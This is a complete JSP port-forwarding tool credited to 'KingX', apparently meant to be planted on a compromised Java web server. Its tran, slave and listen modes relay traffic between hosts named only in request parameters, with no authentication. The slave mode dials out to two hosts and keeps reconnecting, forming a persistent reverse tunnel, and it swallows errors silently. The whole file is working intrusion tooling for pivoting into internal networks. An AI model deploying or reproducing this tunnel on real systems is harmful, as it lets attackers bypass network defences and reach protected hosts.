<%@page pageEncoding="GBK"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.nio.charset.*"%>
<%@page import="javax.servlet.http.HttpServletRequestWrapper"%>
<%@page import="java.net.*"%>
<%
/*code by KingX*/
class KPortTran {
	public void listen(String port1, String port2) {
		ServerSocket listenServerSocket = null;
		ServerSocket outServerSocket = null;
		try {
			listenServerSocket = new ServerSocket(Integer.parseInt(port1));
			outServerSocket = new ServerSocket(Integer.parseInt(port2));
		} catch (NumberFormatException e) {
			
		} catch (IOException e) {
		}
		Socket listenSocket = null;
		Socket outSocket = null;
		try {
			while (true) {	
				listenSocket = listenServerSocket.accept();
				outSocket = outServerSocket.accept();
				new tranThread(outSocket, listenSocket).start();
				new tranThread(listenSocket, outSocket).start();
				Thread.sleep(200);
			}
		} catch (Exception e) {	
	  }
	}

	public void slave(String targetIP, String port1, String srcIP, String port2) throws IOException {
		InetAddress src = InetAddress.getByName(srcIP);
		InetAddress dest = InetAddress.getByName(targetIP);
		int p1 = Integer.parseInt(port1);
		int p2 = Integer.parseInt(port2);
		new Server(src, p2, dest, p1, true);
	}

	public void tran(String srcIP, String port1, String targetIP, String port2)
			throws NumberFormatException, IOException {
		InetAddress src = InetAddress.getByName(srcIP);
		InetAddress dest = InetAddress.getByName(targetIP);
		int p1 = Integer.parseInt(port1);
		int p2 = Integer.parseInt(port2);
		new Server(src, p1, dest, p2, false);
	}
class tranThread extends Thread {
	Socket in;
	Socket out;
	InputStream is;
	OutputStream os;
	public tranThread(Socket in, Socket out) throws IOException {
		this.is = in.getInputStream();
		this.os = out.getOutputStream();
		this.in = in;
		this.out = out;
	}

	private void closeSocket() {
		try {
			is.close();
			os.close();
			in.close();
			out.close();
		} catch (IOException e) {
		}
	}
	@Override
	public void run() {
		super.run();
		byte[] buffer = new byte[4096];
		int len = -1;
		try {
			while (true) {
				if (in.isClosed() || out.isClosed()|| (len = is.read(buffer, 0, buffer.length)) == -1) {
					break;
				} else {
					os.write(buffer, 0, len);
					os.flush();	
				}
			}
		} catch (IOException e) {
			closeSocket();
		} finally {
			closeSocket();
		}
	}
}


class Server extends Thread {
	InetAddress src;
	InetAddress dest;
	int p1, p2;
	boolean reverse = false;
	
	public Server(InetAddress srcIP, int srcPort, InetAddress targetIP,
			int targetPort, boolean flag) {
		this.src = srcIP;
		this.dest = targetIP;
		this.p1 = srcPort;
		this.p2 = targetPort;
		this.reverse = flag;
		start();
	}

	@Override
	public void run() {
		super.run();
		if (reverse) {
			try {
				Socket s = new Socket(src, p1);
				Socket s2 = new Socket(dest, p2);
				new tranThread(s, s2).start();
				new tranThread(s2, s).start();

				while (true) {
					if (s2.isClosed() || s.isClosed()) {
						if (s2.isClosed()) {
							s2 = new Socket(dest, p2);
						}
						if (s.isClosed()) {
							s = new Socket(src, p1);
						}
						new tranThread(s, s2).start();
						new tranThread(s2, s).start();
					}
					Thread.sleep(1000);
				}
			} catch (IOException e) {
			} catch (InterruptedException e) {
			}

		} else {
			ServerSocket ss;
			try {
				ss = new ServerSocket(p1, 5, src);

				while (true) {
					Socket s = ss.accept();
					Socket s2 = new Socket(dest, p2);
					new tranThread(s, s2).start();
					new tranThread(s2, s).start();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
}
%>
<%
final String localIP = request.getParameter("lip");
final String localPort = request.getParameter("lp");
final String localPort2 = request.getParameter("lp2");
final String remoteIP =request.getParameter("rip");
final String remotePort =request.getParameter("rp");
final String mode =request.getParameter("m");

KPortTran pt = new KPortTran();
if (mode.equals("tran")) {
	pt.tran(localIP, localPort, remoteIP , remotePort);
}
if (mode.equals("slave")) {
	pt.slave(localIP, localPort, remoteIP , remotePort);
}
if (mode.equals("listen")) {
	pt.listen(localPort, localPort2);
}

%>